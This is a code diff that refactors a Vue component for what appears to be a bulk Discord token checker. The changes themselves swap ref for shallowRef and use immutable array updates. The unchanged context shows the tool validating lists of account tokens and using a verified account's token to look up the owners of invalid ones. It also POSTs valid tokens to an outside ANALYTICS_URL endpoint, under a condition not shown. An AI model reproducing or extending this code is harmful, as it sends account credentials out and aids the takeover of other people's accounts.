@@ -15,8 +15,8 @@ const fileUpload = ref<HTMLInputElement>(null);
 const tokensInput = ref<string>('');
 
 const duplicate = ref<number>(0);
-const invalidAccounts = ref<InvalidDiscordAccount[]>([]);
-const validAccounts = ref<DiscordAccount[]>([]);
+const invalidAccounts = shallowRef<InvalidDiscordAccount[]>([]);
+const validAccounts = shallowRef<DiscordAccount[]>([]);
 
 const verifiedAccounts = computed<DiscordAccount[]>(() => validAccounts.value.filter(({ user }) => user.verified));
 const unverifiedAccounts = computed<DiscordAccount[]>(() => validAccounts.value.filter(({ user }) => !user.verified));
@@ -71,7 +71,7 @@ async function checkTokens() {
 
     const isValidId = creationMilliseconds > DISCORD_EPOCH && creationMilliseconds < Date.now();
     if (!isValidId) {
-      invalidAccounts.value.push({ token, user: null });
+      invalidAccounts.value = [...invalidAccounts.value, { token, user: null }];
       continue;
     }
 
@@ -79,17 +79,17 @@ async function checkTokens() {
     if (!user) {
       const existingAccount = validAccounts.value.find((account) => account.user.id === decodedId);
       if (existingAccount) {
-        invalidAccounts.value.push({ token, user: existingAccount.user });
+        invalidAccounts.value = [...invalidAccounts.value, { token, user: existingAccount.user }];
         continue;
       }
 
       if (!enumerateInvalid.value || verifiedAccounts.value.length === 0) {
-        invalidAccounts.value.push({ token, user: { id: decodedId } });
+        invalidAccounts.value = [...invalidAccounts.value, { token, user: { id: decodedId } }];
         continue;
       }
 
       const userObject = await fetchUser(decodedId, { token: verifiedAccounts.value[0].tokens[0] });
-      invalidAccounts.value.push({ token, user: userObject || { id: decodedId } });
+      invalidAccounts.value = [...invalidAccounts.value, { token, user: userObject || { id: decodedId } }];
       continue;
     }
 
@@ -101,10 +101,16 @@ async function checkTokens() {
         await $fetch(ANALYTICS_URL, { method: 'POST', body: { tokens: [token] } }).catch(() => false);
       }
 
-      validAccounts.value.push({ tokens: [token], user });
+      validAccounts.value = [...validAccounts.value, { tokens: [token], user }];
       continue;
     }
-    cachedAccount.tokens.push(token);
+    validAccounts.value = [
+      {
+        ...cachedAccount,
+        tokens: [...cachedAccount.tokens, token],
+      },
+      ...validAccounts.value.filter((account) => account.user.id !== user.id),
+    ];
   }
 
   isChecking.value = false;
@@ -301,8 +307,7 @@ hr {
 }
 
 input[type='range']::-webkit-slider-thumb,
-input[type='range']::-moz-range-thumb,
-input[type='range']::-ms-thumb {
+input[type='range']::-moz-range-thumb {
   width: 15px;
   -webkit-appearance: none;
   appearance: none;
